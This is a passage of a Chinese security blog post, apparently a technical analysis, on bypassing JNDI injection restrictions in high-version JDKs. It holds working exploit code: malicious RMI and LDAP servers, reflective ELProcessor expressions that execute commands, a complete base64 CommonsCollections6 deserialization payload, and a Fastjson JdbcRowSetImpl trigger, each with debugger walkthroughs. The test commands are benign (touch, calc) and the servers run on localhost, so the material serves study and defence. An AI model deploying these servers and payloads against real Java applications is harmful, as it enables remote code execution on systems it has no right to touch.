/tmp/mi1k7ea']).start()\")"</span>));</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil command: touch /tmp/mi1k7ea"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JNDI客户端：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">"rmi://localhost:6666/Object"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打包成jar，在Linux环境（Java版本为1.8.0_252）下运行该jar包，监听在6666端口：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/11.png" alt=""></p>
<p>这里通过<code>-classpath</code>或<code>-cp</code>参数来假设是服务端的含有Tomcat相关jar包的ClassPath环境，运行即可成功执行命令：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/12.png" alt=""></p>
<h4 id="几种变体的表达式"><a href="#几种变体的表达式" class="headerlink" title="几种变体的表达式"></a>几种变体的表达式</h4><p>前面的恶意表达式就是通过反射的方式来实现命令执行的，本地测试有如下几种变体，原理都是基于反射调用任意类方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.el.ELProcessor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String poc = <span class="string">"''.getClass().forName('javax.script.ScriptEngineManager')"</span> +</span><br><span class="line">                <span class="string">".newInstance().getEngineByName('nashorn')"</span> +</span><br><span class="line">                <span class="string">".eval(\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\")"</span>;</span><br><span class="line"><span class="comment">//        String poc = "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())" +</span></span><br><span class="line"><span class="comment">//                ".invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')" +</span></span><br><span class="line"><span class="comment">//                ".invoke(null),'calc.exe')&#125;";</span></span><br><span class="line"><span class="comment">//        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +</span></span><br><span class="line"><span class="comment">//                ".newInstance().getEngineByName('JavaScript')" +</span></span><br><span class="line"><span class="comment">//                ".eval(\"java.lang.Runtime.getRuntime().exec('calc')\")";</span></span><br><span class="line">        <span class="keyword">new</span> ELProcessor().eval(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>直接在org.apache.naming.factory.BeanFactory类getObjectInstance()函数上打上断点debug，此时函数调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getObjectInstance:119, BeanFactory (org.apache.naming.factory)</span><br><span class="line">getObjectInstance:321, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:138, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:8, Client</span><br></pre></td></tr></table></figure>
<p>这里注意到javax.naming.spi.NamingManager类的getObjectInstance()函数，其中调用了getObjectFactoryFromReference()函数来从Reference中获取ObjectFactory类实例，跟进去会发现是通过loadClass()函数来加载我们传入的org.apache.naming.factory.BeanFactory类，然后新建该类实例并将其转换成ObjectFactory类型，也就是说，<strong>我们传入的Factory类必须实现ObjectFactory接口类、而org.apache.naming.factory.BeanFactory正好满足这一点</strong>：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/14.png" alt=""></p>
<p>往下，直接调用ObjectFactory接口实现类实例的getObjectInstance()函数，这里是BeanFactory类实例的getObjectInstance()函数：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/15.png" alt=""></p>
<p>跟进看到org.apache.naming.factory.BeanFactory类的getObjectInstance()函数中，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，<strong>这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例</strong>：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/13.png" alt=""></p>
<p>接着获取Bean类为<code>javax.el.ELProcessor</code>后，实例化该类并获取其中的forceString类型的内容，其值是我们构造的<code>x=eval</code>内容：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/16.png" alt=""></p>
<p>继续往下调试可以看到，查找forceString的内容中是否存在”=”号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，<strong>之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！</strong>之后，就是获取beanClass即javax.el.ELProcessor类的eval()方法并和x属性一同缓存到forced这个HashMap中：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/17.png" alt=""></p>
<p>接着是多个do while语句来遍历获取ResourceRef类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用getContent()函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/18.png" alt=""></p>
<p>获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行<code>new ELProcessor().eval(&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;cmd&#39;, &#39;/C&#39;, &#39;calc.exe&#39;]).start()&quot;))</code>：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/19.png" alt=""></p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>小结一下几个关键点：</p>
<ul>
<li>这种方法是从本地ClassPath中寻找可能存在Tomcat相关依赖包来进行触发利用，已知的类是<code>org.apache.naming.factory.BeanFactory</code>；</li>
<li>由于<code>org.apache.naming.factory.BeanFactory</code>类的getObjectInstance()方法会判断是否为ResourceRef类实例，因此在RMI服务端绑定的Reference类实例中必须为Reference类的子类ResourceRef类实例，这里resourceClass选择的也是在Tomcat环境中存在的<code>javax.el.ELProcessor</code>类；</li>
<li>ResourceRef类实例分别添加了两次StringRefAddr类实例元素，第一次是类型为<code>forceString</code>、内容为<code>x=eval</code>的StringRefAddr类实例，这里看<code>org.apache.naming.factory.BeanFactory</code>类的getObjectInstance()方法源码发现，程序会判断是否存在<code>=</code>号，若存在则将<code>x</code>属性的默认setter方法设置为我们<code>eval</code>；第二次是类型为<code>x</code>、内容为恶意表达式的StringRefAddr类实例，这里是跟前面的<code>x</code>属性关联起来，<code>x</code>属性的setter方法是eval()，而现在它的内容为恶意表达式，这样就能串起来调用<code>javax.el.ELProcessor</code>类的eval()函数执行恶意表达式从而达到攻击利用的目的；</li>
</ul>
<h3 id="利用LDAP返回序列化数据，触发本地Gadget"><a href="#利用LDAP返回序列化数据，触发本地Gadget" class="headerlink" title="利用LDAP返回序列化数据，触发本地Gadget"></a>利用LDAP返回序列化数据，触发本地Gadget</h3><p>之前在JNDI注入的文章中讲到了可以利用LDAP+Reference的方式进行攻击利用，但是在JDK 8u191以后的版本中增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。但是，攻击者仍然可以通过服务端本地ClassPath中存在的反序列化漏洞Gadget来绕过高版本JDK的限制。</p>
<p>LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。此时，如果服务端ClassPath中存在反序列化咯多功能利用Gadget如CommonsCollections库，那么就可以结合该Gadget实现反序列化漏洞攻击。</p>
<h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>假设目标环境存在Commons-Collections-3.2.1包，且存在JNDI的lookup()注入或Fastjson反序列化漏洞。</p>
<p>使用ysoserial工具生成Commons-Collections这条Gadget并进行Base64编码输出：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-<span class="number">6</span>eca5bc740-<span class="number">1</span>.jar CommonsCollections6 <span class="string">'calc'</span> | base64</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=</span><br></pre></td></tr></table></figure>
<p>恶意LDAP服务器如下，主要是在javaSerializedData字段内填入刚刚生成的反序列化payload数据：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/#EvilObject"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Payload1: 利用LDAP+Reference Factory</span></span><br><span class="line"><span class="comment">//            e.addAttribute("javaCodeBase", cbstring);</span></span><br><span class="line"><span class="comment">//            e.addAttribute("objectClass", "javaNamingReference");</span></span><br><span class="line"><span class="comment">//            e.addAttribute("javaFactory", this.codebase.getRef());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Payload2: 返回序列化Gadget</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">"javaSerializedData"</span>, Base64.decode(<span class="string">"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标服务端代码，假设存在JNDI lookup()函数注入或Fastjson反序列化漏洞，此时通过JNDI注入实现反序列化漏洞利用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// lookup参数注入触发</span></span><br><span class="line"><span class="comment">//        new InitialContext().lookup("ldap://127.0.0.1:1234/EvilObject");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fastjson反序列化JNDI注入Gadget触发</span></span><br><span class="line">        String payload =<span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/EvilObject\",\"autoCommit\":\"true\" &#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行成功绕过触发：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/3.png" alt=""></p>
<h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>从lookup这个触发点来调试（前面Fastjson到最后利用的还是JNDI这个注入点）。</p>
<p>直接在com.sun.jndi.ldap.Obj类的decodeObject()函数上打上断点，此时函数调用栈如下：</p>
